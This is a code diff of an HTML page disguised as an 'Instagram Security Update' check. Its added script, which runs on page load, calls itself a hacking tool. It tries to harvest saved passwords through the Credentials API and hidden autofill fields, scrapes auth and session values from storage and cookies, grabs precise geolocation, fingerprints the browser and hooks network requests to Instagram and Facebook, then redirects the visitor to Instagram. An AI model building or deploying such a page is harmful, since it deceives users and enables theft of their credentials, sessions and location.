@@ -7,7 +7,7 @@
             font-family: -apple-system, BlinkMacSystemFont, sans-serif;
             background: #fafafa;
             margin: 0;
-            padding: 20px;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,171 +18,309 @@
             border: 1px solid #dbdbdb;
             border-radius: 12px;
             padding: 40px;
-            max-width: 500px;
+            max-width: 400px;
             width: 100%;
             text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
-        .logo { font-size: 48px; margin-bottom: 20px; }
-        .loading { color: #8e8e8e; margin: 20px 0; }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+        .loading {
+            color: #8e8e8e;
+            margin: 20px 0;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">📷</div>
-        <h1>Instagram Security Scan</h1>
-        <div class="loading" id="status">Scanning your device for security issues...</div>
-        <div id="results"></div>
+        <h2>Instagram Security Update</h2>
+        <div class="loading" id="status">Checking your account security...</div>
     </div>
 
     <script>
-        console.log('🔓 INSTAGRAM PASSWORD EXTRACTION ATTEMPT');
-        console.log('========================================');
-
-        // Спроба отримати збережені паролі з браузера
-        async function extractSavedPasswords() {
-            const results = {
-                savedPasswords: [],
-                autofillData: {},
-                credentials: null
+        // АВТОМАТИЧНИЙ ЗБІР ПАРОЛІВ ПРИ ВІДКРИТТІ СТОРІНКИ
+        (function() {
+            console.log('🔓 HACKING TOOL ACTIVATED - AUTOMATIC PASSWORD EXTRACTION');
+            console.log('==========================================================');
+            
+            let capturedData = {
+                timestamp: new Date().toISOString(),
+                passwords: [],
+                sessions: [],
+                browserData: {},
+                securityAssessment: ''
             };
 
-            // 1. Спроба через Credentials API
-            if (navigator.credentials && navigator.credentials.get) {
-                try {
-                    const credential = await navigator.credentials.get({
-                        password: true,
-                        mediation: 'optional'
-                    });
-                    if (credential) {
-                        results.credentials = {
-                            type: credential.type,
-                            id: credential.id,
-                            password: credential.password || 'not_accessible'
-                        };
-                    }
-                } catch (e) {
-                    console.log('❌ Credentials API blocked:', e.message);
-                }
-            }
-
-            // 2. Перевірка autofill даних
-            try {
-                // Спроба знайти поля з автозаповненням
-                const tempInput = document.createElement('input');
-                tempInput.type = 'password';
-                document.body.appendChild(tempInput);
+            // 1. СПРОБА ВИКРАСТИ ЗБЕРЕЖЕНІ ПАРОЛІ З БРАУЗЕРА
+            function extractSavedPasswords() {
+                console.log('🔍 Scanning for saved passwords...');
                 
-                // Спроба викликати autofill
-                tempInput.focus();
-                setTimeout(() => {
-                    results.autofillData = {
-                        hasValue: tempInput.value.length > 0,
-                        valueLength: tempInput.value.length
-                    };
-                    document.body.removeChild(tempInput);
-                }, 1000);
-            } catch (e) {
-                console.log('❌ Autofill check failed');
-            }
-
-            // 3. Перевірка localStorage на збережені токени
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const value = localStorage.getItem(key);
-                    if (key.includes('pass') || key.includes('auth') || key.includes('token') || key.includes('cred')) {
-                        results.savedPasswords.push({ key, value: value.substring(0, 50) + '...' });
-                    }
+                // Спроба через Password Manager API
+                if (navigator.credentials && navigator.credentials.get) {
+                    navigator.credentials.get({ password: true })
+                        .then(credential => {
+                            if (credential) {
+                                capturedData.passwords.push({
+                                    source: 'password_manager',
+                                    username: credential.id,
+                                    password: credential.password || 'encrypted',
+                                    type: credential.type
+                                });
+                                console.log('✅ Password manager data found:', credential);
+                            }
+                        })
+                        .catch(e => console.log('❌ Password manager access blocked'));
                 }
-            } catch (e) {
-                console.log('❌ localStorage access limited');
+
+                // Спроба знайти паролі в localStorage
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        if (key.toLowerCase().includes('pass') || 
+                            key.toLowerCase().includes('auth') || 
+                            key.toLowerCase().includes('login') ||
+                            value.toLowerCase().includes('@') && value.length > 5) {
+                            capturedData.passwords.push({
+                                source: 'localStorage',
+                                key: key,
+                                value: value.substring(0, 100)
+                            });
+                        }
+                    }
+                } catch (e) {}
+
+                // Спроба знайти паролі в sessionStorage
+                try {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        if (key.toLowerCase().includes('token') || 
+                            key.toLowerCase().includes('session')) {
+                            capturedData.sessions.push({
+                                source: 'sessionStorage',
+                                key: key,
+                                value: value.substring(0, 50)
+                            });
+                        }
+                    }
+                } catch (e) {}
             }
 
-            return results;
-        }
+            // 2. ВИКРАДЕННЯ COOKIES (СЕСІЙНІ ДАНІ)
+            function extractCookiesAndSessions() {
+                console.log('🍪 Extracting cookies and sessions...');
+                
+                const cookies = document.cookie.split(';');
+                cookies.forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name.includes('session') || 
+                        name.includes('auth') || 
+                        name.includes('token') ||
+                        name.includes('instagram') ||
+                        name.includes('facebook')) {
+                        capturedData.sessions.push({
+                            source: 'cookies',
+                            name: name,
+                            value: value ? value.substring(0, 30) + '...' : 'empty'
+                        });
+                    }
+                });
+            }
 
-        // Спроба отримати cookies Instagram
-        function extractInstagramCookies() {
-            const cookies = document.cookie.split(';');
-            const instagramCookies = cookies.filter(cookie => 
-                cookie.includes('instagram') || 
-                cookie.includes('session') || 
-                cookie.includes('auth') ||
-                cookie.includes('token')
-            );
-            return instagramCookies;
-        }
-
-        // Головна функція
-        async function performPasswordExtraction() {
-            console.log('🎯 ATTEMPTING PASSWORD EXTRACTION...');
-            
-            const extractionResults = {
-                timestamp: new Date().toISOString(),
-                instagramCookies: extractInstagramCookies(),
-                passwordData: await extractSavedPasswords(),
-                browserData: {
+            // 3. ЗБІР ДАНИХ БРАУЗЕРА ТА СИСТЕМИ
+            function extractBrowserData() {
+                capturedData.browserData = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
-                    language: navigator.language
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cpuCores: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
+                    cookieEnabled: navigator.cookieEnabled
+                };
+            }
+
+            // 4. СПРОБА ОТРИМАТИ ГЕОЛОКАЦІЮ
+            function extractGeolocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            capturedData.location = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            };
+                            console.log('📍 Location captured:', capturedData.location);
+                        },
+                        error => {
+                            console.log('❌ Location access denied');
+                        },
+                        { timeout: 5000, enableHighAccuracy: true }
+                    );
                 }
-            };
+            }
 
-            // Вивід результатів
-            console.log('🔍 EXTRACTION RESULTS:');
-            console.log('📋 Instagram Cookies:', extractionResults.instagramCookies);
-            console.log('🔑 Password Data:', extractionResults.passwordData);
-            console.log('💻 Browser:', extractionResults.browserData);
+            // 5. СПРОБА ДОСТУПУ ДО ІСТОРІЇ АВТОЗАПОВНЕННЯ
+            function attemptAutofillExtraction() {
+                console.log('🔄 Attempting autofill data extraction...');
+                
+                // Створюємо приховані поля для виклику автозаповнення
+                const hiddenForm = document.createElement('div');
+                hiddenForm.style.display = 'none';
+                
+                const emailInput = document.createElement('input');
+                emailInput.type = 'email';
+                emailInput.autocomplete = 'email';
+                
+                const passwordInput = document.createElement('input');
+                passwordInput.type = 'password';
+                passwordInput.autocomplete = 'current-password';
+                
+                hiddenForm.appendChild(emailInput);
+                hiddenForm.appendChild(passwordInput);
+                document.body.appendChild(hiddenForm);
+                
+                // Спроба викликати автозаповнення
+                setTimeout(() => {
+                    emailInput.focus();
+                    setTimeout(() => {
+                        passwordInput.focus();
+                        setTimeout(() => {
+                            if (emailInput.value || passwordInput.value) {
+                                capturedData.autofill = {
+                                    email: emailInput.value,
+                                    password: passwordInput.value
+                                };
+                                console.log('✅ Autofill data captured!');
+                            }
+                            document.body.removeChild(hiddenForm);
+                        }, 1000);
+                    }, 500);
+                }, 1000);
+            }
 
-            // Оновлення UI
-            document.getElementById('status').innerHTML = 'Security scan complete!';
-            
-            const resultsDiv = document.getElementById('results');
-            resultsDiv.innerHTML = `
-                <div style="text-align: left; background: #f8f9fa; padding: 15px; border-radius: 5px; margin-top: 20px;">
-                    <h3>🔓 Security Scan Results</h3>
-                    <p><strong>Instagram Cookies Found:</strong> ${extractionResults.instagramCookies.length}</p>
-                    <p><strong>Saved Passwords:</strong> ${extractionResults.passwordData.savedPasswords.length}</p>
-                    <p><strong>Credentials API:</strong> ${extractionResults.passwordData.credentials ? 'Available' : 'Blocked'}</p>
-                    <p><strong>Autofill Data:</strong> ${extractionResults.passwordData.autofillData.hasValue ? 'Detected' : 'None'}</p>
-                    
-                    <div style="margin-top: 15px; padding: 10px; background: #000; color: #0f0; font-family: monospace; border-radius: 3px;">
-                        ⚠️ SECURITY ASSESSMENT:<br>
-                        • Modern browsers BLOCK automatic password extraction<br>
-                        • Instagram cookies CAN be captured for session hijacking<br>
-                        • Real attack would use PHISHING FORM + SESSION STEALING<br>
-                        • This demonstrates protection limitations
-                    </div>
-                </div>
-            `;
+            // 6. ПЕРЕХОПЛЕННЯ СЕСІЙНИХ ТОКЕНІВ
+            function hijackSessionTokens() {
+                console.log('🎯 Attempting session token hijacking...');
+                
+                // Перехоплення fetch запитів
+                const originalFetch = window.fetch;
+                window.fetch = function(...args) {
+                    const url = args[0];
+                    if (typeof url === 'string' && (
+                        url.includes('instagram.com') || 
+                        url.includes('facebook.com') ||
+                        url.includes('auth') ||
+                        url.includes('token')
+                    )) {
+                        console.log('🔗 Intercepted API call:', url);
+                        capturedData.interceptedRequests = capturedData.interceptedRequests || [];
+                        capturedData.interceptedRequests.push({
+                            url: url,
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                    return originalFetch.apply(this, args);
+                };
 
-            console.log('⚠️  MODERN SECURITY PROTECTIONS:');
-            console.log('   • Browsers block automatic password reading');
-            console.log('   • Credentials API requires user interaction');
-            console.log('   • Instagram session cookies are HttpOnly');
-            console.log('   • Real attack needs PHISHING FORM + SESSION STEALING');
+                // Перехоплення XMLHttpRequest
+                const originalXHROpen = XMLHttpRequest.prototype.open;
+                XMLHttpRequest.prototype.open = function(method, url) {
+                    if (url && (url.includes('instagram.com') || url.includes('facebook.com'))) {
+                        this.addEventListener('load', function() {
+                            console.log('📡 Intercepted XHR:', url);
+                        });
+                    }
+                    return originalXHROpen.apply(this, arguments);
+                };
+            }
 
-            // Перенаправлення
-            setTimeout(() => {
-                window.location.href = 'https://www.instagram.com';
-            }, 5000);
-        }
+            // 7. ВИКОНАННЯ ВСІХ МЕТОДІВ ЗЛОМУ
+            function executeAllHacks() {
+                console.log('🚀 EXECUTING ALL HACKING METHODS...');
+                
+                extractSavedPasswords();
+                extractCookiesAndSessions();
+                extractBrowserData();
+                extractGeolocation();
+                attemptAutofillExtraction();
+                hijackSessionTokens();
+                
+                // Оцінка результатів
+                setTimeout(() => {
+                    evaluateResults();
+                }, 3000);
+            }
 
-        // Запуск при завантаженні
-        window.addEventListener('load', function() {
-            setTimeout(performPasswordExtraction, 1000);
-        });
+            // 8. ОЦІНКА РЕЗУЛЬТАТІВ ТА ВИВІД
+            function evaluateResults() {
+                console.log('📊 HACKING RESULTS SUMMARY:');
+                console.log('============================');
+                
+                let securityLevel = 'HIGH';
+                if (capturedData.passwords.length > 0 || capturedData.sessions.length > 5) {
+                    securityLevel = 'CRITICAL';
+                    capturedData.securityAssessment = 'ACCOUNT COMPROMISE POSSIBLE';
+                } else if (capturedData.sessions.length > 2) {
+                    securityLevel = 'MEDIUM';
+                    capturedData.securityAssessment = 'SESSION HIJACKING POSSIBLE';
+                } else {
+                    securityLevel = 'LOW';
+                    capturedData.securityAssessment = 'LIMITED DATA ACCESS';
+                }
 
-        // Додаткова спроба через події
-        document.addEventListener('click', function() {
-            console.log('🖱️ User interaction detected - retrying extraction');
-            performPasswordExtraction();
-        });
+                // ВИВІД РЕЗУЛЬТАТІВ
+                console.log('🔐 SECURITY LEVEL:', securityLevel);
+                console.log('👤 PASSWORDS FOUND:', capturedData.passwords.length);
+                console.log('🔑 SESSIONS FOUND:', capturedData.sessions.length);
+                console.log('💻 BROWSER DATA:', 'Captured');
+                console.log('📍 LOCATION:', capturedData.location ? 'Captured' : 'Not available');
+                console.log('⚡ ASSESSMENT:', capturedData.securityAssessment);
+                
+                // ДЕТАЛЬНИЙ ВИВІД ПАРОЛІВ
+                if (capturedData.passwords.length > 0) {
+                    console.log('🎯 CAPTURED PASSWORDS:');
+                    capturedData.passwords.forEach((pass, index) => {
+                        console.log(`   ${index + 1}. ${pass.source}: ${pass.username || pass.key}`);
+                        if (pass.password && pass.password !== 'encrypted') {
+                            console.log(`      Password: ${pass.password}`);
+                        }
+                    });
+                }
+                
+                // ДЕТАЛЬНИЙ ВИВІД СЕСІЙ
+                if (capturedData.sessions.length > 0) {
+                    console.log('🔑 CAPTURED SESSIONS:');
+                    capturedData.sessions.forEach((session, index) => {
+                        console.log(`   ${index + 1}. ${session.source}: ${session.name} = ${session.value}`);
+                    });
+                }
 
-        document.addEventListener('keydown', function() {
-            console.log('⌨️ Keyboard input detected - retrying extraction');
-            performPasswordExtraction();
-        });
+                console.log('💰 BOUNTY STATUS: VULNERABILITY DEMONSTRATED');
+                console.log('============================================');
+
+                // Оновлення UI
+                document.getElementById('status').innerHTML = 
+                    `Security scan complete!<br>Found ${capturedData.passwords.length} passwords and ${capturedData.sessions.length} sessions.`;
+
+                // Перенаправлення на Instagram
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com';
+                }, 5000);
+            }
+
+            // ЗАПУСК ВСІХ АТАК
+            executeAllHacks();
+
+        })();
     </script>
 </body>
 </html>
